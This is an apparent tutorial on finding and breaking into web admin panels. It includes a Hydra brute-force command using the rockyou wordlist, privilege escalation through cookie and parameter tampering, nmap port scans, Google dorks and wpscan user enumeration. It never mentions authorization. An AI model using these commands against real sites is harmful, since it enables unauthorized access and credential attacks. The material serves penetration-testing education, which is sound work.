##  Practical Walkthrough: Finding and Testing Admin Interfaces

###  Tools You’ll Need

* **Browser with DevTools** (Chrome/Firefox)
* **OWASP ZAP** (for forced browsing and inspecting traffic)
* **THC-HYDRA** (for brute-forcing logins)
* **curl** or **Burp Suite** (optional for manual testing)
* **Wordlists** (like SecLists: `/usr/share/seclists/Discovery/Web-Content/` if on Kali Linux)



##  Step-by-Step Testing Guide


###  Step 1: **Check the Source Code for Clues**

1. Open a target website in your browser.
2. Right-click → “View Page Source”
3. Search for hints like:

   ```html
   <a href="/admin/">Admin Panel</a>
   <input type="hidden" name="isAdmin" value="false">
   ```
4. Also look at cookie values in DevTools → Application → Cookies:

   ```http
   Cookie: sessionid=xyz123; admin=false
   ```

   → Try changing `admin=false` to `admin=true`.



###  Step 2: **Try Common Admin Paths Manually**

In your browser, try paths like:

```
https://target-site.com/admin
https://target-site.com/login.php
https://target-site.com/wp-admin
```

Use this list of common paths (from SecLists):

```bash
/usr/share/seclists/Discovery/Web-Content/common.txt
```



###  Step 3: **Automated Directory Brute Force with OWASP ZAP**

1. Open **OWASP ZAP**
2. Set your browser to proxy through ZAP (usually `127.0.0.1:8080`)
3. Visit the site to populate ZAP
4. Right-click target → “Attack” → “Forced Browse” (use built-in wordlists)
5. It will scan for hidden directories like `/admin`, `/dashboard`, etc.


###  Step 4: **Use Google Dorks**

Try these queries in Google:

```
site:target-site.com inurl:admin
site:target-site.com intitle:"login"
site:target-site.com "Welcome Admin"
```

This may reveal open or unlisted admin pages indexed by search engines.



###  Step 5: **Brute Force Login with THC-HYDRA**

If you find a login form:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target-site.com http-post-form "/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

* Replace the path and parameters with the actual values
* `F=incorrect` is the failure message seen on login attempts



###  Step 6: **Try Parameter Tampering**

Send this in `curl` or Burp:

```bash
curl -X POST https://target-site.com/dashboard \
  -d "user=normal&admin=1"
```

Or modify:

```http
Cookie: sessionid=xyz; useradmin=1
```



###  Step 7: **Check for Alternate Ports**

Some admin panels use other ports:

```bash
nmap -p 1-10000 target-site.com
```

Check for open ports like:

* `8080` (Tomcat Admin)
* `8443` (WebLogic Admin)
* `2082` / `2083` (cPanel)



##  Bonus: Testing Known CMSs

If the site is built on a CMS like WordPress, Joomla, etc., try:

```bash
https://target.com/wp-admin/
https://target.com/administrator/
```

Use tools like **wpscan**:

```bash
wpscan --url https://target.com --enumerate u
```


